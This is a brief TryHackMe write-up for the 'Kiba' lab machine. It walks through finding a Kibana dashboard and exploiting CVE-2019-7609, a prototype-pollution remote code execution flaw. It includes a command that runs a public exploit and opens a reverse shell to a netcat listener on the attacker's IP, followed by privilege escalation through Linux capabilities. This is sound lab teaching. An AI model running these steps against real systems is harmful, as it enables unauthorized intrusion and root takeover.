Easy level machine from TryHackMe, it's about exploiting systems that use Kibana. So, what is Kibana?
Kibana is a source-available data visualization dashboard software for Elasticsearch, whose free and open source fork in OpenSearch is OpenSearch Dashboards. (Wikipédia)

The fisrt question is:
## What is the vulnerability that is specific to programming languages with prototype-based inheritance?

Let's google it.

### Enumeration

Feel free to use -T 5 option. 😉

![nmap](/assets/kiba/nmap.png)

On port 80 we see:

We have one clue about linux capabilities. Keep it in mind. On port 5601 we see the kibana's dashbord.

## What is the version of visualization dashboard installed in the server?

Click on Management section.

## What is the CVE number for this vulnerability?

## Compromise the machine and locate user.txt

It's show time!
Let's use [this exploit](https://github.com/LandGrey/CVE-2019-7609). Note: Be sure that you have python2 intalled.

```
python2 CVE-2019-7609-kibana-rce.py -u http://10.10.227.122:5601/ -host 10.13.19.119 -port 1234 --shell
```

Before running, get your netcat ready! And your output should be something like this:

![exploit](/assets/kiba/exploit.png)

And your reverse shell will be in your netcat!

Capabilities is a concept that provides a security system that allows "divide" root privileges into different values.
## How would you recursively list all of these capabilities?

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

You can read more about it here ☝️

getcap -r /

## Escalate privileges and obtain root.txt

Let's read the capabilities.

`getcap -r / 2>/dev/null`

Take a look in [GTFObins](https://gtfobins.github.io/gtfobins/python/#capabilities) website

Note: you need enter in the file .hackmeplease to work! Then it will use the python that is vulnerable.

I hope you had fun as I did too! See you in the next write-up 👋 Bye!
